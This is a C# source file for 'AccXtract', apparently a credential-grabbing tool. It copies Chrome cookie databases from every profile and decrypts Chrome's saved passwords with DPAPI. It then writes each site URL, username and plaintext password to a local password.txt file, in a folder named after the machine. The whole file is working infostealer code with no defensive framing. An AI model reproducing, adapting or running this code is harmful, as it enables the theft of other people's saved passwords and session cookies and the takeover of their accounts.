//Copyright 2013 Garrett Davidson
//
//This file is part of AccXtract
//
//    AccXtract is free software: you can redistribute it and/or modify
//    it under the terms of the GNU General Public License as published by
//    the Free Software Foundation, either version 3 of the License, or
//    (at your option) any later version.
//
//    AccXtract is distributed in the hope that it will be useful,
//    but WITHOUT ANY WARRANTY; without even the implied warranty of
//    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//    GNU General Public License for more details.
//
//    You should have received a copy of the GNU General Public License
//    along with AccXtract.  If not, see <http://www.gnu.org/licenses/>.

using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Data.SQLite;
using System.Runtime.InteropServices;
using System.ComponentModel;


namespace Grabber
{
    class Program
    {
        static void Main(string[] args)
        {
            string cd = Directory.GetCurrentDirectory();
            string home = Environment.ExpandEnvironmentVariables("%HOMEDRIVE%%HOMEPATH%");

            cd += "\\AccXtract";


            #region Chrome cookies
            if (Directory.Exists(home + @"\AppData\Local\Google\Chrome"))
            {

                Directory.CreateDirectory(cd + "\\" + System.Environment.MachineName + "\\Chrome\\Default");

                string chromePath = home + @"\AppData\Local\Google\Chrome\User Data\";

                List<string> list = new List<string>();
                System.IO.StreamReader file = new StreamReader(chromePath + @"\Local State");

                int currentNumberOfProfiles = 0;
                string line;
                bool foundProfile = false;
                while ((line = file.ReadLine()) != null)
                {
                    if (line.Contains(@"Profile "))
                    {

                        string[] values = line.Split('"');
                        Console.WriteLine(values[1]);
                        list.Add(values[1]);
                        foundProfile = true;

                        currentNumberOfProfiles++;
                    }
                    else if (line.Contains(@"""name"":") && foundProfile)
                    {
                        string[] values = line.Split('"');
                        Console.WriteLine(values[3]);
                        foundProfile = false;
                        list.Add(values[3]);
                    }
                }

                File.Copy(home + @"\AppData\Local\Google\Chrome\User Data\Default\Cookies", cd + "\\" + System.Environment.MachineName + "\\Chrome\\Default\\cookies", true);

                //list.RemoveAt(0);

                while (list.Count != 0)
                {
                    Directory.CreateDirectory(cd + "\\" + System.Environment.MachineName + "\\Chrome\\" + list[1]);
                    File.Copy(home + @"\AppData\Local\Google\Chrome\User Data\" + list[0] + "\\Cookies", cd + "\\" + System.Environment.MachineName + "\\Chrome\\" + list[1] + "\\cookies", true);

                    list.RemoveAt(0);
                    list.RemoveAt(0);
                }

                file.Close();
            }
            #endregion


            #region Chrome Passwords

            string copiedLoginData = cd + "\\Login Data";
            File.Copy(home + @"\AppData\Local\Google\Chrome\User Data\Default\Login Data", copiedLoginData, true);

            SQLiteConnection conn = new SQLiteConnection("Data Source=" + copiedLoginData);

            conn.Open();

            SQLiteCommand retrieveData = conn.CreateCommand();
            retrieveData.CommandText = "SELECT action_url, username_value, password_value FROM logins";
            SQLiteDataReader data = retrieveData.ExecuteReader();

            List<string> decryptedData = new List<string>();
            while (data.Read())
            {
                byte[] bytes = (byte[])data["password_value"];
                //byte[] outBytes = DPAPI.Decrypt(bytes, null, out outstring);

                byte[] outBytes = DPAPI.decryptBytes(bytes);

                string url = (string)data["action_url"];
                string username = (string)data["username_value"];
                string password = Encoding.Default.GetString(outBytes);

                if (password != "")
                {
                    decryptedData.Add(url);
                    decryptedData.Add(username);
                    decryptedData.Add(password);
                }
            }

            Directory.CreateDirectory(cd + "\\" + System.Environment.MachineName + "\\Chrome\\Default");
            File.WriteAllLines(cd + "\\" + System.Environment.MachineName + "\\password.txt", decryptedData.ToArray());

            conn.Close();
            conn.Dispose();

            #endregion
        }
    }
}
